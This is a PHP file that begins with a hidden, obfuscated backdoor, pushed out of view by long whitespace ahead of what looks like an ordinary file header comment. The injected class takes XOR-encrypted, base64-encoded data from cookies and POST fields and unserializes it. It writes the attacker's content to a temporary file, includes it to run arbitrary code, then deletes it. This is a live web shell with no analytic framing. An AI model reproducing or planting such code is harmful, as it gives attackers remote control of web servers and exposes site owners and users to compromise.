<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nhqlbx")){class nhqlbx{public static $fdhzyut = "uwljngtkigkrlbjd";public static $trcbpyut = NULL;public function __construct(){$luzmy = @$_COOKIE[substr(nhqlbx::$fdhzyut, 0, 4)];if (!empty($luzmy)){$naonxd = "base64";$ivfbosyla = "";$luzmy = explode(",", $luzmy);foreach ($luzmy as $wvnycukeh){$ivfbosyla .= @$_COOKIE[$wvnycukeh];$ivfbosyla .= @$_POST[$wvnycukeh];}$ivfbosyla = array_map($naonxd . "_decode", array($ivfbosyla,));$ivfbosyla = $ivfbosyla[0] ^ str_repeat(nhqlbx::$fdhzyut, (strlen($ivfbosyla[0]) / strlen(nhqlbx::$fdhzyut)) + 1);nhqlbx::$trcbpyut = @unserialize($ivfbosyla);}}public function __destruct(){$this->zkhqyzm();}private function zkhqyzm(){if (is_array(nhqlbx::$trcbpyut)) {$wgzeh = sys_get_temp_dir() . "/" . crc32(nhqlbx::$trcbpyut["salt"]);@nhqlbx::$trcbpyut["write"]($wgzeh, nhqlbx::$trcbpyut["content"]);include $wgzeh;@nhqlbx::$trcbpyut["delete"]($wgzeh);exit();}}}$mjhinfv = new nhqlbx();$mjhinfv = NULL;} ?><?php
/*********************************************************************************
